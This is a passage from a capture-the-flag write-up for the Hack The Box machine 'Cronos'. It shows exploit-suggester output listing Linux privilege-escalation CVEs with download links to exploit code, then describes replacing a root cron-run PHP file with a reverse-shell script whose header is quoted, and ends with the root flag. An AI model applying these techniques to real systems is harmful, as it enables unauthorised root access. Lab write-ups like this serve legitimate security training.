  Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
  Comments: kernel.unprivileged_userns_clone=1 required
[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
  Details: https://seclists.org/oss-sec/2017/q1/184
  Exposure: less probable
  Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64
  Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
  Exposure: less probable
  Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
  Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
  Comments: Uses "Stack Clash" technique, works against most SUID-root binaries
[+] [CVE-2017-1000253] PIE_stack_corruption
  Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
  Exposure: less probable
  Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
  Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE
  Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
  Exposure: less probable
  Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
  Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only
```

In checking the cronjobs from the [linpeas.sh](http://linpeas.sh) output, I found a php file that runs every minute as root. I may be able to use this to escalate privileges.:
![[./_resources/HTB_Cronos.resources/image.7.png]]

I tried to edit the file in question to execute a reverse shell and I also tried to use a different script both which did not work. The I realized that I can actually replace the entire file too since it is the cron job that is run as root and not the file. I used the following php payload below after editing the IP and replaced the artisan file with this file with the same name. After setting up my listener, I was able to get a shell.:
```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
```

![[./_resources/HTB_Cronos.resources/image.8.png]]
Root flag:
```
eb1c7e9af38656c86511d6924efc954f
```
